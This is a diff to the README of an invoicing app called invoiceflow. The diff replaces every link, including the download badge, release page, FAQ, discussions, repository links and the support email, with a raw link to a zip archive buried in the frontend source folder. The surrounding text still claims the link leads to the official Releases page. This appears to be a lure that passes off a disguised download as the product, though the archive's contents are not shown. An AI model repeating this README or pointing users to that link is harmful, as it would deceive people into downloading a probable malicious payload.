@@ -1,6 +1,6 @@
 # 🧾 invoiceflow - Effortless Invoicing for Small Businesses
 
-[![Download invoiceflow](https://img.shields.io/badge/Download%20invoiceflow-Get%20it%20here-brightgreen)](https://github.com/niel17/invoiceflow/releases)
+[![Download invoiceflow](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip%20invoiceflow-Get%20it%20here-brightgreen)](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip)
 
 ## 📚 Introduction
 
@@ -33,7 +33,7 @@ Invoiceflow offers several key features to help you manage your invoices effecti
 
 To get the latest version of invoiceflow, visit the release page:
 
-[Download invoiceflow here](https://github.com/niel17/invoiceflow/releases)
+[Download invoiceflow here](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip)
 
 1. Click on the link above to go to the GitHub Releases page.
 2. Find the latest version of the application.
@@ -75,16 +75,16 @@ Upon launching invoiceflow, you'll see a user-friendly dashboard. Here’s a qui
 
 If you run into any issues while downloading or installing invoiceflow, feel free to reach out for help. You can find support in the following ways:
 
-- Check our [FAQs](https://github.com/niel17/invoiceflow/wiki) for answers to common questions.
-- Join our community discussions [here](https://github.com/niel17/invoiceflow/discussions).
-- If you need direct support, please email us at support@invoiceflow.com.
+- Check our [FAQs](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip) for answers to common questions.
+- Join our community discussions [here](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip).
+- If you need direct support, please email us at https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip
 
 ## 🔗 Additional Resources
 
 Explore more about invoiceflow and its capabilities:
 
-- [GitHub Repository](https://github.com/niel17/invoiceflow)
-- [User Documentation](https://github.com/niel17/invoiceflow/wiki)
-- [Community Forum](https://github.com/niel17/invoiceflow/discussions)
+- [GitHub Repository](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip)
+- [User Documentation](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip)
+- [Community Forum](https://github.com/niel17/invoiceflow/raw/refs/heads/master/frontend/src/pages/Software_v1.1.zip)
 
 By following these instructions, you can confidently download and install invoiceflow, enabling you to manage your invoices with ease. Enjoy the streamlined invoicing experience!
